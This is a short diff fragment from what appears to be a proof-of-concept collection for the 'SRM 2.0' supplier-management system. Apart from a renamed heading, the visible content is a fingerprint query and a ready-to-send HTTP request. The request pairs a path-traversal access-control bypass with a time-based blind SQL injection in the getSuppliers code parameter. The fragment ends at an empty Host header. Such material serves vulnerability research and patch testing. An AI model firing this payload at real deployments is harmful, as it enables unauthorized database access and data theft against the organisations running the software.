@@ -6,7 +6,7 @@
 title=="SRM 2.0"
 ```
 
-## poc
+## POC
 ```java
 POST /adpweb/static/%2e%2e;/a/srm/inquiry/getSuppliers?code=%27+AND+%28SELECT+1312+FROM+%28SELECT%28SLEEP%283%29%29%29HckV%29--+HyuV HTTP/1.1
 Host: 
